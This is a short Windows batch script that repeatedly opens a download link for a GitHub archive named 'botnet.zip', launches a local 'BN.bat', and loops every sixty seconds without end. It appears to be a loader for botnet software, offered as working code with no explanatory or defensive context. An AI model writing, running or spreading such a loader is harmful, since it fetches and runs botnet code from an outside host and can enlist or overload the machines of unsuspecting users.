@echo off
:main
start https://github.com/NOCRUF/NCbot/archive/refs/tags/botnet.zip
timeout 2
start BN.bat
goto time
:time
timeout 60
goto main